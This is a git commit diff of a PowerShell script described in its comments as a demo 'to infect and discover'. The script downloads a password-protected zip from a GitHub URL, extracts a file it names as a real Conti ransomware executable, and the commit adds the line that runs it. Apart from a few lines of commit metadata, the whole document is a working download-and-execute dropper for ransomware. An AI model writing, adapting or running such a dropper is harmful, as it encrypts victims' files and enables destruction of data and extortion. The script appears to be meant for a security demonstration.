9fa029cd7ea02a2db6a3ff66ca1aca93da057bd9
kalev kuusik <kalev@bytelife.ee>
2021-08-12 14:39:06 +0300

    ps1 updated to execute, doc renamed

--- download-and-run.ps1
+++ download-and-run.ps1
@@ -1,3 +1,6 @@
+# part of demo to infect and discover
+# downloads from Github to user Downloads folder, unpacks w. passwd and executes
+# WARNING, uses real ransomware (Conti) to encrypt files
 $downloadPath = "$env:USERPROFILE\Downloads"
 $zipFilePath = "$downloadPath\conti-temp.zip"
 $exeFile = "conti-ebeca2df24a.exe"
@@ -5,6 +8,6 @@ $outExePath = "$downloadPath\$exeFile"
 $url = "https://github.com/turvas/ps_test/raw/master/conti-ebeca2df24a.zip"
 Invoke-WebRequest -Uri $url -OutFile $zipFilePath
 & 'C:\Program Files\7-Zip\7z.exe' x $zipFilePath $exeFile -o"$downloadPath" -pDanger
-
+$outExePath
  
 
